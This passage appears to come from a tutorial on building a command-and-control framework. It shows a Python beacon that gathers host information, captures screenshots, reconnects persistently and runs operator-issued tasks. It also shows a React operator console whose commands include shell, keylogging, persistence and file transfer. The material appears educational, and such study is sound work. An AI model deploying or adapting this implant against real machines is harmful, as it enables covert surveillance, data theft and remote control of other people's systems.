        for addr in addrs:
            if addr.family == socket.AF_INET:
                net_info[iface] = addr.address

    return {
        "output":
        json.dumps(
            {
                "os": f"{platform.system()} {platform.release()}",
                "hostname": socket.gethostname(),
                "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
                "arch": platform.machine(),
                "cpu_count": psutil.cpu_count(),
                "cpu_percent": psutil.cpu_percent(interval=0.5),
                "memory_total_gb": round(mem.total / (1024**3), 2),
                "memory_available_gb": round(mem.available / (1024**3), 2),
                "memory_percent": mem.percent,
                "disks": disk_info,
                "network": net_info,
            },
            indent=2),
        "error": None,
    }
```

This handler uses psutil to collect CPU, memory, disk, and network information. The `PermissionError` catch around `disk_usage` handles partitions that the current user cannot access (like `/boot/efi` on some systems). Network info filters to IPv4 only (`socket.AF_INET`) to keep the output readable. The whole thing is JSON-serialized and returned as the `output` string.

**Screenshot capture:**

```python
async def handle_screenshot(_args: str | None) -> dict[str, Any]:
    try:
        import mss

        with mss.mss() as sct:
            monitor = sct.monitors[0]
            screenshot = sct.grab(monitor)
            png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

        return {
            "output":
            json.dumps({
                "format": "png",
                "content": base64.b64encode(png_bytes).decode("ascii"),
                "width": screenshot.width,
                "height": screenshot.height,
            }),
            "error": None,
        }
    except Exception as exc:
        return {"output": None, "error": f"Screenshot failed: {exc}"}
```

The `mss` library is imported inside the function rather than at module level. This is intentional. If `mss` is not installed (headless server, minimal container), the beacon still starts up fine. The import only fails when someone actually requests a screenshot, and that failure is caught and returned as an error message. `sct.monitors[0]` captures the entire virtual screen (all monitors combined). The raw RGB data is converted to PNG bytes and Base64-encoded for transport over the text-based protocol.

### 7.4 Main Loop

```python
async def main() -> None:
    backoff = config.reconnect_base

    while True:
        try:
            logger.info("Connecting to %s", config.server_url)

            async with connect(config.server_url) as ws:
                sysinfo = collect_system_info()
                await ws.send(pack("REGISTER", sysinfo))
                logger.info("Registered as %s", config.beacon_id)

                backoff = config.reconnect_base

                heartbeat_task = asyncio.create_task(heartbeat_loop(ws))

                try:
                    while True:
                        raw = await ws.recv()
                        message = unpack(raw)

                        if message.get("type") == "TASK":
                            payload = message["payload"]
                            task_id = payload["id"]
                            command = payload["command"]
                            args = payload.get("args")

                            logger.info("Executing: %s %s", command, args or "")
                            result = await dispatch(command, args)

                            response = pack(
                                "RESULT", {
                                    "task_id": task_id,
                                    "output": result.get("output"),
                                    "error": result.get("error"),
                                })
                            await ws.send(response)

                        await asyncio.sleep(jittered_sleep())
                finally:
                    heartbeat_task.cancel()

        except (
                ConnectionRefusedError,
                websockets.exceptions.ConnectionClosed,
                OSError,
        ) as exc:
            logger.warning("Connection lost: %s", exc)
            logger.info("Reconnecting in %.1fs", backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, config.reconnect_max)
```

The outer `while True` is the reconnection loop. The beacon never gives up. If the server is down, it keeps trying with exponential backoff: 2 seconds, 4 seconds, 8 seconds, 16 seconds, and so on up to the configured maximum of 300 seconds (5 minutes). Once it successfully connects, the backoff resets to the base value.

Inside a successful connection, the beacon immediately sends a REGISTER message with its system info. Then it starts a heartbeat coroutine as a background task. The heartbeat loop sends periodic HEARTBEAT messages on the jittered sleep interval (default 3 seconds plus or minus 30%).

The main receive loop reads messages from the server. Right now, the only message type the server sends to beacons is TASK. When a TASK arrives, the beacon dispatches it to the appropriate handler, collects the result, and sends back a RESULT message. The `await asyncio.sleep(jittered_sleep())` after processing each message adds a small delay that mimics a real implant's behavior of not responding instantly.

The `finally` block cancels the heartbeat task when the inner loop exits (due to disconnection or error). This prevents the heartbeat from trying to send on a dead WebSocket.

---

## 8. Frontend WebSocket Store (`frontend/src/core/ws.ts`)

The frontend state management centers on a Zustand store that holds all C2 state and a custom hook that manages the WebSocket connection.

### 8.1 The Store

```typescript
import { useEffect, useRef } from 'react'
import { toast } from 'sonner'
import { create } from 'zustand'
import { devtools } from 'zustand/middleware'
import { useShallow } from 'zustand/react/shallow'
import { WS_ENDPOINTS } from '@/config'
import type { BeaconRecord, CommandType, TaskResult } from './types'
import { parseServerMessage } from './types'

interface C2State {
  beacons: Record<string, BeaconRecord>
  taskResults: TaskResult[]
  taskIdMap: Record<string, string>
  connected: boolean
}

interface C2Actions {
  setBeacons: (list: BeaconRecord[]) => void
  upsertBeacon: (
    beacon: Omit<BeaconRecord, 'active' | 'first_seen' | 'last_seen'>
  ) => void
  markDisconnected: (id: string) => void
  markHeartbeat: (id: string) => void
  addTaskResult: (result: TaskResult) => void
  mapTaskId: (localId: string, taskId: string) => void
  setConnected: (connected: boolean) => void
  clearResults: () => void
}
```

The `beacons` field is a `Record<string, BeaconRecord>`, which is TypeScript for a plain object used as a dictionary. The key is the beacon ID, the value is the full beacon record. We use `Record` instead of `Map` because of a specific React 19 compatibility issue. React 19 introduced changes to `useSyncExternalStore` (which Zustand uses internally) that cause infinite render loops when the store contains `Map` or `Set` instances. The problem is that React compares state snapshots by reference, and `Map` operations always produce new references even when the contents have not changed. Using plain objects with spread syntax (`{ ...state.beacons, [id]: newBeacon }`) avoids this because the spread only creates a new reference when something actually changes.

The `taskIdMap` is a `Record<string, string>` mapping local IDs (generated client-side) to real task IDs (generated server-side). This is the bridge that connects the "I submitted a task" action in the session UI to the "here is the result" event that arrives later.

### 8.2 Derived Selectors

```typescript
export const useBeacons = (): BeaconRecord[] =>
  useC2Store(useShallow((s) => Object.values(s.beacons)))

export const useBeacon = (id: string): BeaconRecord | undefined =>
  useC2Store((s) => s.beacons[id])

export const useTaskResults = (): TaskResult[] => useC2Store((s) => s.taskResults)

export const useTaskIdMap = (): Record<string, string> =>
  useC2Store((s) => s.taskIdMap)

export const useIsConnected = (): boolean => useC2Store((s) => s.connected)
```

`useBeacons` uses `useShallow` from Zustand. Without it, `Object.values(s.beacons)` would create a new array on every store update, causing every component that uses `useBeacons` to re-render even if the beacons did not change. `useShallow` performs a shallow equality check on the array elements, preventing unnecessary re-renders when only unrelated state (like `taskResults`) changes.

`useBeacon` does not need `useShallow` because it returns a single object reference. If that specific beacon's data has not changed, Zustand's default reference equality check is sufficient.

### 8.3 The WebSocket Hook

```typescript
export function useOperatorSocket(): {
  sendTask: (
    beaconId: string,
    command: CommandType,
    args?: string,
    localId?: string
  ) => void
} {
  const wsRef = useRef<WebSocket | null>(null)
  const reconnectTimer = useRef<ReturnType<typeof setTimeout> | null>(null)

  useEffect(() => {
    const {
      setBeacons,
      upsertBeacon,
      markDisconnected,
      markHeartbeat,
      addTaskResult,
      mapTaskId,
      setConnected,
    } = useC2Store.getState()

    let attempt = 0

    function connect(): void {
      const ws = new WebSocket(getWsUrl())
      wsRef.current = ws

      ws.onopen = () => {
        attempt = 0
        setConnected(true)
      }

      ws.onmessage = (event) => {
        const message = parseServerMessage(event.data as string)
        if (message === null) return

        switch (message.type) {
          case 'beacon_list':
            setBeacons(message.payload)
            break
          case 'beacon_connected':
            upsertBeacon(message.payload)
            toast.success(`Beacon connected: ${message.payload.hostname}`)
            break
          case 'beacon_disconnected':
            markDisconnected(message.payload.id)
            break
          case 'heartbeat':
            markHeartbeat(message.payload.id)
            break
          case 'task_result':
            addTaskResult(message.payload)
            break
          case 'task_submitted':
            mapTaskId(message.payload.local_id, message.payload.task_id)
            break
        }
      }

      ws.onclose = () => {
        setConnected(false)
        const delay = Math.min(1000 * 2 ** attempt, 30000)
        attempt += 1
        reconnectTimer.current = setTimeout(connect, delay)
      }

      ws.onerror = () => {
        ws.close()
      }
    }

    connect()

    return () => {
      if (reconnectTimer.current !== null) {
        clearTimeout(reconnectTimer.current)
      }
      wsRef.current?.close()
    }
  }, [])

  function sendTask(
    beaconId: string,
    command: CommandType,
    args?: string,
    localId?: string
  ): void {
    const ws = wsRef.current
    if (ws === null || ws.readyState !== WebSocket.OPEN) return

    ws.send(
      JSON.stringify({
        type: 'submit_task',
        payload: {
          beacon_id: beaconId,
          command,
          args: args ?? null,
          local_id: localId ?? null,
        },
      })
    )
  }

  return { sendTask }
}
```

The hook uses `useRef` for both the WebSocket instance and the reconnect timer. Using refs instead of state is deliberate. We do not want WebSocket lifecycle events to cause re-renders. The actual UI state (beacons, results, connection status) is managed through the Zustand store, which does trigger re-renders when relevant data changes.

Actions are extracted from the store via `useC2Store.getState()` inside the effect. This gives us stable function references that do not change between renders, which means the effect's dependency array can be empty (`[]`). The effect runs once on mount and cleans up on unmount.

The reconnection logic mirrors the beacon's exponential backoff: 1 second, 2 seconds, 4, 8, 16, up to 30 seconds max. The `onclose` handler always schedules a reconnect. The `onerror` handler just closes the socket, which triggers `onclose`, which triggers the reconnect. This two-step pattern (error closes, close reconnects) avoids duplicate reconnection attempts.

The `sendTask` function checks `ws.readyState !== WebSocket.OPEN` before sending. This prevents errors when the user clicks a button during a brief disconnection window.

### 8.4 Type-Safe Message Parsing (`frontend/src/core/types.ts`)

```typescript
import { z } from 'zod/v4'

export const WsServerMessage = z.discriminatedUnion('type', [
  WsBeaconList,
  WsBeaconConnected,
  WsBeaconDisconnected,
  WsHeartbeat,
  WsTaskResult,
  WsTaskSubmitted,
])
export type WsServerMessage = z.infer<typeof WsServerMessage>

export function parseServerMessage(raw: string): WsServerMessage | null {
  const result = WsServerMessage.safeParse(JSON.parse(raw))
  return result.success ? result.data : null
}
```

Every WebSocket message from the server is validated through a Zod discriminated union before being dispatched to the store. The `type` field determines which schema to use. If the message does not match any known schema, `safeParse` returns `{ success: false }` and `parseServerMessage` returns `null`. The `onmessage` handler checks `if (message === null) return`, silently dropping malformed messages. This means a buggy server cannot crash the frontend with unexpected data shapes.

---

## 9. Frontend Pages

### 9.1 Dashboard (`frontend/src/pages/dashboard/index.tsx`)

The dashboard displays all beacons in a table with real-time status updates.

```typescript
function formatRelativeTime(iso: string): string {
  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000)
  if (diff < 5) return 'just now'
  if (diff < 60) return `${diff}s ago`
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`
  return `${Math.floor(diff / 86400)}d ago`
}

function isOnline(lastSeen: string): boolean {
  return Date.now() - new Date(lastSeen).getTime() < 30_000
}
```

`formatRelativeTime` converts ISO timestamps to human-readable strings like "3s ago" or "2h ago". The threshold cascade (5s, 60s, 3600s, 86400s) picks the most appropriate unit.

`isOnline` uses a 30-second threshold. If the beacon's `last_seen` timestamp is more than 30 seconds old, it is considered offline. This aligns with the beacon's default 3-second heartbeat interval. Even with 30% jitter, a healthy beacon should heartbeat at least every 3.9 seconds. If 30 seconds pass without a heartbeat, something is wrong.

The key UI trick for making timestamps update live:

```typescript
export function Component(): React.ReactElement {
  useOperatorSocket()
  const beacons = useBeacons()
  const connected = useIsConnected()
  const navigate = useNavigate()
  const [, setTick] = useState(0)

  useEffect(() => {
    const interval = setInterval(() => setTick((t) => t + 1), 1000)
    return () => clearInterval(interval)
  }, [])
```

The `setTick` state is a counter that increments every second. We never read the counter. Its only purpose is to force a re-render every second, which causes `formatRelativeTime` and `isOnline` to recalculate against the current time. Without this tick, the timestamps would freeze at whatever value they had when the component last rendered due to a store update.

Each beacon row is clickable and navigates to the session page:

```typescript
<BeaconRow
  key={b.id}
  beacon={b}
  onClick={() => navigate(ROUTES.SESSION(b.id))}
/>
```

The `ROUTES.SESSION(b.id)` call produces a URL like `/session/abc-123-def`, which is matched by the React Router configuration to render the Session component.

### 9.2 Session (`frontend/src/pages/session/index.tsx`)

The session page provides a terminal-like interface for interacting with a specific beacon.

**Command parsing:**

```typescript
const COMMANDS: CommandType[] = [
  'shell', 'sysinfo', 'proclist', 'upload', 'download',
  'screenshot', 'keylog_start', 'keylog_stop', 'persist', 'sleep',
]

function parseInput(raw: string): { command: CommandType; args?: string } | null {
  const trimmed = raw.trim()
  if (trimmed.length === 0) return null

  const spaceIdx = trimmed.indexOf(' ')
  const cmd = spaceIdx === -1 ? trimmed : trimmed.slice(0, spaceIdx)
  const args = spaceIdx === -1 ? undefined : trimmed.slice(spaceIdx + 1).trim()

  if (!COMMANDS.includes(cmd as CommandType)) return null
  return { command: cmd as CommandType, args: args || undefined }
}
```

The parser splits on the first space. Everything before the space is the command, everything after is the args. So `shell whoami` becomes `{ command: "shell", args: "whoami" }` and `sysinfo` becomes `{ command: "sysinfo", args: undefined }`. Unknown commands return `null` and are silently ignored.

**Task ID mapping and result matching:**

```typescript
const handleSend = useCallback(
  (command: CommandType, args?: string) => {
    if (!id) return
    const taskId = `local-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
    setEntries((prev) => [...prev, { command, args, result: null, taskId }])
    sendTask(id, command, args, taskId)
  },
  [id, sendTask]
)
```

When the user submits a command, we generate a `local-*` ID like `local-1708012345678-k3m9x2`. This ID is sent to the server as `local_id`. The server generates a real UUID, submits the task, and sends back a `task_submitted` ack that maps `local_id` to `task_id`. This mapping is stored in the Zustand `taskIdMap`.

Then, when task results arrive:

```typescript
useEffect(() => {
  setEntries((prev) =>
    prev.map((entry) => {
      if (entry.result !== null) return entry
      const realId = taskIdMap[entry.taskId]
      if (!realId) return entry
      const match = taskResults.find((r) => r.task_id === realId)
      if (match) return { ...entry, result: match }
      return entry
    })
  )
}, [taskResults, taskIdMap])
```

This effect runs whenever `taskResults` or `taskIdMap` changes. For each pending entry (result is null), it looks up the real task ID via `taskIdMap`, then searches `taskResults` for a match. When found, it updates the entry with the result. This two-phase lookup (local ID to real ID, real ID to result) is necessary because the local ID, the task submission, the ID mapping ack, and the task result all arrive at different times via different mechanisms.

**History navigation and autocomplete:**

```typescript
const handleKeyDown = useCallback(
  (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      handleSubmit()
      return
    }

    if (e.key === 'ArrowUp') {
      e.preventDefault()
      if (history.length === 0) return
      const next = Math.min(historyIdx + 1, history.length - 1)
      setHistoryIdx(next)
      setInput(history[next])
      return
    }

    if (e.key === 'ArrowDown') {
      e.preventDefault()
      if (historyIdx <= 0) {
        setHistoryIdx(-1)
        setInput('')
        return
      }
      const next = historyIdx - 1
      setHistoryIdx(next)
      setInput(history[next])
      return
    }

    if (e.key === 'Tab' && suggestions.length > 0) {
      e.preventDefault()
      setInput(suggestions[0])
      setSuggestions([])
    }
  },
  [handleSubmit, history, historyIdx, suggestions]
)
```

Arrow Up/Down cycles through command history, just like a real terminal. The history is stored in reverse chronological order (newest first), so Arrow Up increments the index and Arrow Down decrements it. When the index reaches -1 (before the most recent command), the input clears.

Tab completion fills in the first suggestion. Suggestions are generated as the user types:

```typescript
const handleInputChange = useCallback(
  (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value
    setInput(val)
    setHistoryIdx(-1)

    const cmd = val.split(' ')[0].toLowerCase()
    if (cmd.length > 0 && !val.includes(' ')) {
      setSuggestions(COMMANDS.filter((c) => c.startsWith(cmd) && c !== cmd))
    } else {
      setSuggestions([])
    }
  },
  []
)
```

Suggestions only appear while typing the command name (before any space). Once you type a space (indicating you are now entering args), suggestions disappear. The filter excludes exact matches so you do not see a suggestion for `shell` when you have already typed `shell`.

---

## Common Pitfalls

These are problems we encountered during development that are worth documenting for anyone working on a similar project.

**Map vs Record in Zustand.** Our first implementation used `Map<string, BeaconRecord>` in the store. This caused infinite render loops with React 19's `useSyncExternalStore`. The root cause is that Zustand's default equality check uses `Object.is()`, and `Map` operations always produce new references. Switching to `Record<string, BeaconRecord>` (plain objects) with spread syntax resolved it completely. Always use plain objects with Zustand.

**React 19 useRef requires initial value.** In React 18, you could write `useRef<WebSocket>()` and get `undefined`. React 19 requires an explicit initial value: `useRef<WebSocket | null>(null)`. The TypeScript types enforce this. If you see "Expected 1 argument, got 0" on a `useRef` call, this is why.

**Task ID mismatch.** The frontend generates local IDs (`local-*`), the backend generates real UUIDs. Without the `task_submitted` acknowledgment that maps between them, the frontend has no way to match incoming results to the correct terminal entry. If you remove the `mapTaskId` call, results will never appear in the terminal output.

**aiosqlite row_factory.** Without `db.row_factory = aiosqlite.Row`, queries return tuples. The pattern `BeaconRecord(**dict(row))` will fail with `TypeError: cannot convert 'tuple' object to dict`. This is easy to forget because `get_db()` sets it automatically, but if you ever create a connection manually (for example, in tests), you need to set it yourself.

---

## Debugging Tips

**Check backend logs:**

```
just dev-logs backend
```

This tails the backend container's stdout. Look for "Beacon registered" and "Beacon disconnected" messages to verify the handshake is working. Protocol errors show up as WARNING-level messages with the specific `ValueError` description.

**Check nginx logs:**

```
just dev-logs nginx
```

If WebSocket connections are failing to establish, the problem is often in nginx's proxy configuration. Look for 502 (Bad Gateway) or 101 (Switching Protocols) status codes. A 502 usually means the backend container is not running or nginx cannot resolve the hostname.

**Browser DevTools Network tab.** Open the Network tab, filter by "WS" (WebSocket). Click on the WebSocket connection to see individual frames. You can see the raw messages being sent and received. They will be Base64-encoded (the XOR output), but the structure is visible. Look for the initial `beacon_list` frame after connection, and `heartbeat` frames arriving at the expected interval.

**Zustand DevTools.** Install the Redux DevTools browser extension. Zustand's `devtools` middleware (which we use on both `useC2Store` and `useUIStore`) integrates with it. You can see every store action, its payload, and the resulting state. This is invaluable for debugging "why did the beacon disappear from the table" type issues. Look for `c2/markDisconnected` or `c2/setBeacons` actions.

**Run the beacon locally:**

```
just beacon
```

This starts a single beacon instance pointing at your local dev server. The justfile sets the `C2_SERVER_URL` and `C2_XOR_KEY` environment variables from your `.env` file automatically.
